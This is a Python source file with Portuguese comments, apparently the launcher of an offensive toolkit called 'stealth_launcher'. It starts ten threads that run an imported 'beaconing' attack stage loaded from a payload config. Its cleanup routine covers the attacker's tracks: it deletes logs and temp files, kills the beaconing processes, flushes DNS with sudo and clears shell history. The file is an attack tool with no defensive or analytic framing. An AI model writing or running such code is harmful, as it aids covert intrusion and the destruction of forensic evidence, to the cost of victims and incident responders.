import os
import sys
import time
import threading
import logging
import psutil
import tempfile
from pathlib import Path
import yaml  # para debug de YAML

# Ajuste do logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)

# Constantes
CLEANUP_TIMEOUT = 10  # segundos
MAX_THREADS = 10

# Determina o diretório base do pacote (stealth_launcher)
BASE_PACKAGE_DIR = Path(__file__).resolve().parent

# Paths derivados
LOG_DIR     = BASE_PACKAGE_DIR / "logs"
LOG_FILE    = LOG_DIR / "beaconing.log"
TMP_DIR     = Path(os.getenv("TMPDIR") or os.getenv("TMP") or tempfile.gettempdir())
# Configuração dentro de stages/config
CONFIG_PATH = BASE_PACKAGE_DIR / "config" / "config.yaml"

# DEBUG: verifica conteúdo do YAML antes de carregar
print(f">> DEBUG: abrindo      : {CONFIG_PATH}, exists? {CONFIG_PATH.exists()}")
raw = yaml.safe_load(CONFIG_PATH.read_text())
print(f">> DEBUG: conteúdo YAML: {raw}")
print(f">> DEBUG: PAYLOAD_PATH in raw? {'PAYLOAD_PATH' in raw}")

# Carrega cfg para attack
from stealth_launcher.config import load_config
cfg = load_config(str(CONFIG_PATH))

# Import do estágio de beaconing
from stealth_launcher.stages.beaconing import beaconing_stage


def cleanup():
    # 1) remover log beaconing
    try:
        LOG_FILE.unlink()
        logging.info(f"Removido log: {LOG_FILE}")
    except FileNotFoundError:
        logging.warning(f"Log não encontrado (ok): {LOG_FILE}")
    except Exception as e:
        logging.error(f"Falha removendo log {LOG_FILE}: {e}")

    # 2) remover arquivos temporários
    for tmp in TMP_DIR.glob("beaconing_*"):
        try:
            tmp.unlink()
            logging.info(f"Removido temp: {tmp}")
        except Exception as e:
            logging.error(f"Erro removendo {tmp}: {e}")

    # 3) matar processos beaconing_stage
    for proc in psutil.process_iter(['pid','name']):
        if proc.info['name'] == 'beaconing_stage':
            try:
                proc.kill()
                logging.info(f"Morto proc: {proc.info['pid']}")
            except Exception as e:
                logging.error(f"Erro matando {proc.info['pid']}: {e}")

    # 4) flush DNS
    try:
        if os.name == 'nt':
            os.system("ipconfig /flushdns")
        else:
            os.system("sudo systemd-resolve --flush-caches || sudo rndc flush")
        logging.info("Flush DNS executado")
    except Exception as e:
        logging.error(f"Erro flush DNS: {e}")

    # 5) limpar histórico shell (Linux)
    if os.name != 'nt':
        try:
            os.system("history -c")
            logging.info("Histórico shell limpo")
        except Exception as e:
            logging.error(f"Erro limpando histórico: {e}")

    # 6) descarregar módulos stealth_launcher
    for name in list(sys.modules):
        if name.startswith("stealth_launcher"):
            del sys.modules[name]
            logging.info(f"Descarregado módulo: {name}")

    logging.info("Cleanup concluída")

# Alias para import em orchestrator
cleanup_stage = cleanup


def attack():
    try:
        beaconing_stage(cfg)
        while True:
            time.sleep(1)
    except Exception as e:
        logging.error(f"Erro no ataque: {e}")


def main():
    # Garante que o diretório de logs exista
    LOG_DIR.mkdir(exist_ok=True)

    # Inicia threads de ataque
    threads = []
    for _ in range(MAX_THREADS):
        t = threading.Thread(target=attack, daemon=True)
        t.start()
        threads.append(t)

    # Inicia cleanup em paralelo
    cleanup_thread = threading.Thread(target=cleanup, daemon=True)
    cleanup_thread.start()

    # Aguarda término (ou CTRL-C)
    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        logging.info("Interrompido pelo usuário, iniciando cleanup final...")
        cleanup()

if __name__ == "__main__":
    main()
